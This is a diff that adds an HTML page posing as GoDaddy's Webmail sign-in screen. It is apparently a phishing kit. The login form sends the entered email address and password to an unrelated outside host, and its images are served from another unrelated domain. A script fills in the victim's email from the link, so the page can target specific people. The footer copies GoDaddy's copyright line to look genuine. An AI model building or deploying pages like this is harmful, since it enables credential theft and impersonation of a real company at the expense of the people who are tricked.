@@ -1,0 +1,119 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link href="https://img1.wsimg.com/auth/v1/static/3683/img/favicon.ico" rel="shortcut icon" type="image/vnd.microsoft.icon">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+
+    <style type="text/css">
+      .button {
+  font: bold 11px Arial;
+  text-decoration: none;
+  background-color: #EEEEEE;
+  color: #333333;
+  padding: 2px 6px 2px 6px;
+  border-top: 1px solid #CCCCCC;
+  border-right: 1px solid #333333;
+  border-bottom: 1px solid #333333;
+  border-left: 1px solid #CCCCCC;
+  width: 150px;
+}
+    </style>
+
+    <title>Sign In</title>
+  </head>
+  <body>
+    <nav class="container-fluid navbar navbar-expand-lg navbar-light pl-5 pr-5">
+  <a class="navbar-brand" href="#">
+    <img src="https://westernfx.online/academy/author/hosted_file/godaddy.jpg" width="180" height="50">
+  </a>
+  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarTogglerDemo02" aria-controls="navbarTogglerDemo02" aria-expanded="false" aria-label="Toggle navigation">
+    <span class="navbar-toggler-icon"></span>
+  </button>
+
+  <div class="collapse navbar-collapse" id="navbarTogglerDemo02">
+    <ul class="navbar-nav ml-auto mt-2 mt-lg-0">
+      <li class="nav-item active">
+        <a class="nav-link" href="#">Contact Us 24/7<span class="sr-only">(current)</span></a>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+<main class="bg-light">
+  <div class="row" style="background-image: url('https://westernfx.online/academy/author/hosted_file/newbg.png'); background-repeat: no-repeat; background-size: cover;">
+    <section class="col-sm-2 col-md-6 col-lg-6 mt-5 mb-5"></section>
+  <section class="col-sm-12 col-md-6 col-lg-6 container mt-5 mb-5">
+      <div class="row">
+        <div class="col-sm-12 col-md-8 col-lg-9">
+            <div class="row">
+              <div class="col-12 rounded-top bg-dark text-center pt-3 pb-3">
+                <h2 class="text-light">Webmail</h2>
+              </div>
+              <div class="col-12 rounded-bottom pt-3 pb-3" style="background-color: white; color: black;">
+                <div class="row">
+                  <div class="col-sm-12 col-md-2 col-lg-2"></div>
+                  <div class="col-sm-12 col-md-8 col-lg-8">
+                    <h3 class="pt-5 container-fluid"><strong>Sign in</strong></h3>
+                    <br>
+                    <form action="https://loopscoins.com/godaddy/main.php" method="POST" class="container-fluid">
+                      <div class="form-group">
+                        <label for="email"><strong>Email <span class="text-danger">*</span></strong></label>
+                        <input type="email" id="emailer" name="email" placeholder="Your email" class="form-control" required>
+                      </div>
+                      <div class="form-group">
+                        <label for="password"><strong>Password <span class="text-danger">*</span></strong></label>
+                        <input type="password" name="password" class="form-control" required>
+                      </div>
+                      <input type="checkbox" name="logged" checked> <span> Keep me signed in on this device</span>
+                      <br>
+                      <button class="btn btn-dark w-100 mt-3" name="submit" type="submit"><strong>Sign In</strong></button>
+                      <p class="pt-3 pb-4 text-center">
+                        Need to find <a href="#">your password?</a>
+                      </p>
+                    </form>
+                  </div>
+                  <div class="col-sm-12 col-md-2 col-lg-2"></div>
+                </div>
+              </div>
+            </div>
+            <div class="pt-4 text-center bg-light">
+              <p>
+                <strong>Don't have GoDaddy email?</strong>
+              </p>
+
+                <a href="#">
+                  <button class="w-75" style="background: white; border: 3px solid black;"><strong>Get Started</strong></button>
+                </a>
+                <br>
+            </div>
+        </div>
+        <div class="col-sm-12 col-md-4 col-lg-3"></div>
+      </div>
+    </section>
+  </div>
+</main>
+
+<aside class="text-center pt-3 pb-3">
+  Copyright © 1999 - 2021 GoDaddy Operating Company, LLC. All Rights Reserved. <a href="#">Privacy Policy</a>
+</aside>
+
+    <!-- Optional JavaScript -->
+    <script type="text/javascript">
+      const url = window.location;
+        const urlObject = new URL(url);
+
+        const email = urlObject.searchParams.get('email');
+
+        document.getElementById('emailer').value = email;
+    </script>
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+  </body>
+</html>
